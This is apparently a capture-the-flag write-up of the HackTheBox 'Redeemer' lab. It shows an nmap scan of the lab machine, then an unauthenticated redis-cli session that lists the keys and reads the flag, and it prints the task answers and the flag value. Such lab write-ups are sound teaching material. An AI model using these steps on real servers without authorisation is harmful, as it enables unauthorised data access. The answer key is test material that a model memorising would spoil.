+++
date = 2024-07-04
title = "HTB Redeemer WriteUp"
slug = ""
author = ["R4NC0X"]
description = "HackThebox 'Redeemer' WriteUp"
draft = false
tags = [
    "HTB",
    "machine",
    "Linux",
    "Redis",
    "Vulnerability Assessment",
    "Databases",
    "Reconnaissance",
    "Anonymous/guest access",
]
+++

# Redeemer -- HacktheBox

- System: _Linux_
- Difficulty: _Very Easy_
- Plataform: _HacktheBox_

!['Redeemer' Avatar](/images/Redeemer/Redeemer.webp)

___

## Summary

"Redeemer" is a "Very Easy" difficulty machine from the `HackTheBox` platform. Redeemer is part of the `Starting Point` laboratories.

To complete this machine, use nmap to perform port scanning at the ip address `---`. The machine proposes the use of the `Redis` service whose protocol is `6379`, having already confirmed that the port is open, proceed to use the command `redis-cli -h [IpAddress]`, with this I entered the machine and using the `INFO` command I was able to analyze which version of Redis is running as well as know how many clients and keys there are, having all this information with the use of the command `KEYS *` ready the keys that the machine has, one of the 4 is named `flag` so with the `GET flag` command I ready the content by finding the flag and resolving the machine.

___

## Procedure

Start by solving the Machine Tasks, some of the tasks are clues to solve the machine.

- **Task 1 What TCP port is open on the machine?**

`6379`

- **Task 2 What service is running on the open port on the machine?**

`Redis`

- **Task 3 What type of database is Redis? Choose from the following options: (i) In-memory database, (ii) Traditional database**

`In-memory Database`

- **Task 4 What command line utility is used to interact with the Redis server? Enter the name of the program that you would enter into the terminal without any arguments.**

`redis-cli`

- **Task 5 Which flag is used with the Redis command line utility to specify the host name?**

`-h`

- **Task 6 Once connected to a Redis server, what command is used to obtain information and statistics about the Redis server?**

`Info`

- **Task 7 What is the version of the Redis server used on the target machine?**

`5.0.7`

- **Task 8 What command is used to select the desired database in Redis?**

`Select`

- **Task 9 How many keys are there in the database with index 0?**

`4`

- **Task 10 What command is used to obtain all the keys of a database?**

`keys *`

- **Send Root Flag**

To find the flag, perform a scan in nmap to the IP address, normally I use nmap with basic parameters like `-sVC` and `-vvv` but on this machine those parameters were not enough so I tried new ones and the line was somewhat So.

```bash
nmap -p- -sV -sC --open -sS -vvv -n -Pn 10.129.5.10 -oN escan

```
![Anexo1](/images/Redeemer/Anexo1.png)

Since the scan was completed with the `cat` command ready, it left us with the `scan` file to view the results.

``` bash
cat escan
───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: escan
───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ # Nmap 7.94SVN scan initiated Sat Jul  6 13:17:38 2024 as: nmap -p- -sV -sC --open -sS -vvv -n -Pn -oN escan4 10.129.5.10
   2   │ Nmap scan report for 10.129.5.10
   3   │ Host is up, received user-set (0.12s latency).
   4   │ Scanned at 2024-07-06 13:17:39 -05 for 90s
   5   │ Not shown: 62999 closed tcp ports (reset), 2535 filtered tcp ports (no-response)
   6   │ Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
   7   │ PORT     STATE SERVICE REASON         VERSION
   8   │ 6379/tcp open  redis   syn-ack ttl 63 Redis key-value store 5.0.7
   9   │ 
  10   │ Read data files from: /usr/bin/../share/nmap
  11   │ Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  12   │ # Nmap done at Sat Jul  6 13:19:09 2024 -- 1 IP address (1 host up) scanned in 90.54 seconds

```
The scan shows me that port `6379` is open running a `Redis` service with version `5.0.7` so I use the command `redis-cli -h [IpAddress]` to enter the machine.

![Anexo2](/images/Redeemer/Anexo2.png)

With the `Info` command I see all the information about the machine, both its version and its databases and keys.

``` bash
10.129.5.10:6379> INFO
# Server
redis_version:5.0.7
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:66bd629f924ac924
redis_mode:standalone
os:Linux 5.4.0-77-generic x86_64
arch_bits:64
multiplexing_api:epoll
atomicvar_api:atomic-builtin
gcc_version:9.3.0
process_id:751
run_id:67caed8156dbdfb9b290f2bc0e536eb132211056
tcp_port:6379
uptime_in_seconds:736
uptime_in_days:0
hz:10
configured_hz:10
lru_clock:9014456
executable:/usr/bin/redis-server
config_file:/etc/redis/redis.conf

# Clients
connected_clients:1
client_recent_max_input_buffer:2
client_recent_max_output_buffer:0
blocked_clients:0

# Memory
used_memory:859624
used_memory_human:839.48K
used_memory_rss:5931008
used_memory_rss_human:5.66M
used_memory_peak:859624
used_memory_peak_human:839.48K
used_memory_peak_perc:100.00%
used_memory_overhead:847166
used_memory_startup:797248
used_memory_dataset:12458
used_memory_dataset_perc:19.97%
allocator_allocated:1613720
allocator_active:1949696
allocator_resident:9158656
total_system_memory:2084024320
total_system_memory_human:1.94G
used_memory_lua:41984
used_memory_lua_human:41.00K
used_memory_scripts:0
used_memory_scripts_human:0B
number_of_cached_scripts:0
maxmemory:0
maxmemory_human:0B
maxmemory_policy:noeviction
allocator_frag_ratio:1.21
allocator_frag_bytes:335976
allocator_rss_ratio:4.70
allocator_rss_bytes:7208960
rss_overhead_ratio:0.65
rss_overhead_bytes:-3227648
mem_fragmentation_ratio:7.25
mem_fragmentation_bytes:5113392
mem_not_counted_for_evict:0
mem_replication_backlog:0
mem_clients_slaves:0
mem_clients_normal:49694
mem_aof_buffer:0
mem_allocator:jemalloc-5.2.1
active_defrag_running:0
lazyfree_pending_objects:0

# Persistence
loading:0
rdb_changes_since_last_save:4
rdb_bgsave_in_progress:0
rdb_last_save_time:1720289752
rdb_last_bgsave_status:ok
rdb_last_bgsave_time_sec:-1
rdb_current_bgsave_time_sec:-1
rdb_last_cow_size:0
aof_enabled:0
aof_rewrite_in_progress:0
aof_rewrite_scheduled:0
aof_last_rewrite_time_sec:-1
aof_current_rewrite_time_sec:-1
aof_last_bgrewrite_status:ok
aof_last_write_status:ok
aof_last_cow_size:0

# Stats
total_connections_received:6
total_commands_processed:7
instantaneous_ops_per_sec:0
total_net_input_bytes:320
total_net_output_bytes:14861
instantaneous_input_kbps:0.00
instantaneous_output_kbps:0.00
rejected_connections:0
sync_full:0
sync_partial_ok:0
sync_partial_err:0
expired_keys:0
expired_stale_perc:0.00
expired_time_cap_reached_count:0
evicted_keys:0
keyspace_hits:0
keyspace_misses:0
pubsub_channels:0
pubsub_patterns:0
latest_fork_usec:0
migrate_cached_sockets:0
slave_expires_tracked_keys:0
active_defrag_hits:0
active_defrag_misses:0
active_defrag_key_hits:0
active_defrag_key_misses:0

# Replication
role:master
connected_slaves:0
master_replid:1c50de888450ccfff8bbab453f4d427909a601c6
master_replid2:0000000000000000000000000000000000000000
master_repl_offset:0
second_repl_offset:-1
repl_backlog_active:0
repl_backlog_size:1048576
repl_backlog_first_byte_offset:0
repl_backlog_histlen:0

# CPU
used_cpu_sys:0.433843
used_cpu_user:0.327325
used_cpu_sys_children:0.000000
used_cpu_user_children:0.000000

# Cluster
cluster_enabled:0

# Keyspace
db0:keys=4,expires=0,avg_ttl=0
(2.31s)
10.129.5.10:6379>

```
Since I knew all the information, I'm left with what interests me, which would be what `#Keyspace` contains.

``` bash
# Keyspace
db0:keys=4,expires=0,avg_ttl=0
(2.31s)
10.129.5.10:6379>

```
With this information I knew that `database 0` contains 4 keys so with the `keys *` command I listed all the existing keys.

``` bash
10.129.5.10:6379> KEYS *
1) "stor"
2) "flag"
3) "temp"
4) "numb"
10.129.5.10:6379> 

```
I noticed that the literal `2` contains the name of `flag` so with the `get` command I ready its contents.

``` bash
10.129.5.10:6379> GET flag
"03e1d2b376c37ab3f5319922053953eb"
10.129.5.10:6379> 

```
I enter the flag in the last Task of the machine `Send Flag`.

Once the flag was sent, a message came out saying `Redeemer has been Pwned`.

![Anexo3](/images/Redeemer/Anexo3.png)
___

## Completed Machine :)




